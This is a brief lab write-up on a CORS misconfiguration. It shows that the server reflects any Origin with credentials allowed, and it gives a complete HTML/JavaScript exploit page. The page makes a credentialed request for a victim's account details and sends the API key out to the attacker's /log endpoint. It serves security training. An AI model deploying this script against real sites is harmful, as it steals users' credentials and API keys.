- The web app allows any `Origin:` header
- And responds with

Origin: https://anywebsite.com


**Access-Control-Allow-Origin: https://anywebsite.com**
**Access-Control-Allow-Credentials: true**


![cors-lab-01](https://github.com/user-attachments/assets/44def984-a276-44a1-850a-cc1bc4c63d20)


- And the HTML-Java Script you send to the victim to steal their API key:

```html

<html>
    <body>
        <!-- The main body of the HTML document -->
        <h1>Hello World!</h1>
        <!-- Displays a heading on the page -->

        <script>
            <!-- Start of the embedded JavaScript code -->

            // Create a new XMLHttpRequest object to make HTTP requests.
            var xhr = new XMLHttpRequest();

            // PUT YOUR URL HERE: Define the URL for the target server where the request will be sent.
            var url = "https:/labid.web-security-academy.net"

            // Define a function to handle the state change of the XMLHttpRequest object.
            xhr.onreadystatechange = function() {
                // Check if the request has completed (readyState == DONE).
                if (xhr.readyState == XMLHttpRequest.DONE) {
                    // Send the response text from the previous request to the /log endpoint of the current origin.
                    fetch("/log?key=" + xhr.responseText);
                }
            };

            // Configure the XMLHttpRequest object to make a GET request to the account details endpoint.
            xhr.open('GET', url + "/accountDetails", true);

            // Indicate that the request should include credentials (cookies, authorization headers, etc.).
            xhr.withCredentials = true;

            // Send the configured HTTP GET request.
            xhr.send(null);

            <!-- End of the script -->
        </script>
    </body>
</html>

```
